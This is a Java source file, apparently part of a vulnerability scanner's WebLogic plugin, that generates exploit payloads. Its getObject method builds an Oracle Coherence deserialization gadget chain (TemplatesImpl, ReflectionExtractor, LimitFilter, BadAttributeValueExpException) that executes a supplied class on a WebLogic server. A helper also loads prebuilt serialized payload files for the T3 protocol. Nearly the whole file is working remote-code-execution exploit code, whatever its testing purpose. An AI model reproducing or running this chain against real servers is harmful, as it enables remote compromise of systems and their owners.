package com.gbw.scanner.plugins.scripts.weblogic.payload;

import com.gbw.scanner.plugins.scripts.weblogic.GBWScanWeblogicConfig;
import com.gbw.scanner.utils.FileUtils;
import com.gbw.scanner.utils.Gadgets;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import com.xmap.api.utils.TextUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import javax.management.BadAttributeValueExpException;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;


public class GBWCoherencePayload implements GBWEchoPayload<Object> {

    private static final Logger log = LoggerFactory.getLogger(GBWCoherencePayload.class);
    private List<PayloadEntry> payloadEntries;
    private PayloadEntry defaultPayload;
    private GBWScanWeblogicConfig config;

    public GBWCoherencePayload(GBWScanWeblogicConfig config) throws Exception {

        this.config = config;
        this.payloadEntries = new ArrayList<>();
        this.defaultPayload = null;

        if(config.getVersions()!=null&&config.getVersions().length>0) {

            init();
        }

    }

    public void init() throws Exception{

        for (String version : config.getVersions()) {

            PayloadEntry payloadEntry = new PayloadEntry(version, genPayload(version));
            payloadEntries.add(payloadEntry);

            if (!TextUtils.isEmpty(config.getDefaultVersion()) && version.equals(config.getDefaultVersion()))
                defaultPayload = payloadEntry;
        }
    }

    private byte[] genPayload(String version) throws IOException {

        String filePath = String.format("%s/coherence_%s.data",config.getPayloadScriptDir(),version);

        if(!FileUtils.hasContent(filePath)){

            log.error(String.format("Make weblogic payload for version:%s,path:%s failed!",version,filePath));
            throw new IOException("make weblogic payload failed!");
        }

        return Files.readAllBytes(Paths.get(filePath));
    }

    @Override
    public Object getObject(String version,Class echoClass) throws Exception{

        Object templates = Gadgets.createTemplatesImpl(echoClass);
        //定义单次反射要调用的方法
        ValueExtractor valueExtractor = new ReflectionExtractor("getOutputProperties", new Object[0]);
        //构造LimitFilter实例，并将temp放入
        LimitFilter limitFilter = new LimitFilter();
        limitFilter.setTopAnchor(templates);
        BadAttributeValueExpException expException = new BadAttributeValueExpException(null);

        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, valueExtractor);

        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, templates);

        Field val = expException.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(expException, limitFilter);
        return expException;
    }


    @Override
    public String getName() {
        return "GBWCoherencePayload";
    }

    public byte[] makeT3Payload(String version, Class echoClass) throws Exception {

        String nversion = version.replace(".","");

        for(PayloadEntry entry:payloadEntries){

            if(nversion.contains(entry.version)){

                log.info(String.format("Find a weblogic payload for version:%s",version));
                return entry.getPayload();
            }
        }

        if(defaultPayload!=null) {
            log.info(String.format("use default payload version:%s for version:%s",defaultPayload.getVersion(),version));
            return defaultPayload.getPayload();
        }

        return null;
    }


    private class PayloadEntry{

        private String version;
        private byte[] payload;

        public PayloadEntry(String version,byte[] payload){

            this.version = version;
            this.payload = payload;
        }

        public String getVersion() {
            return version;
        }

        public void setVersion(String version) {
            this.version = version;
        }

        public byte[] getPayload() {
            return payload;
        }

        public void setPayload(byte[] payload) {
            this.payload = payload;
        }
    };



}
